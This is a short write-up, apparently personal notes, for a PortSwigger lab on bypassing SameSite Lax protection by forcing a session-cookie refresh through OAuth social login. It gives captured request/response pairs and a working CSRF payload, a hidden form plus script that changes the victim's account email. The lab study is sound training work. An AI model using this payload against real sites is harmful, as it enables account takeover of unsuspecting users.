# [SameSite Lax bypass via cookie refresh](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh)

during the OAuth login procedure, the request/responses will get to a point where a cookie will set the `samesite=none`

> during first log in ->

request:
`/auth/HpRqB3SokIb_ZWJpD590T`

->

response:
`Set-Cookie: _session=li-MjUJbh1lmhWrZu-ttD; path=/; expires=Thu, 28 May 2026 22:04:10 GMT; samesite=none; secure; httponly`

> log out then log in ->

request:
`/auth?client_id=nt61nehal9mdmhsgcidjq&redirect_uri=https://xxx.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email`

->

response:
`Set-Cookie: _session=li-MjUJbh1lmhWrZu-ttD; path=/; expires=Thu, 28 May 2026 22:10:14 GMT; samesite=none; secure; httponly`

> the `samesite=none` state will let the exploit work, but in 2 minutes the browser will default back to `samesite=lax`

exploit:

```
<form method="POST" action="https://xxx.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="dux@quack.net" />
</form>
<script>
  window.open("https://xxx.web-security-academy.net/social-login");
  setTimeout(changeEmail, 5000);

  function changeEmail() {
    document.forms[0].submit();
  }
</script>
```
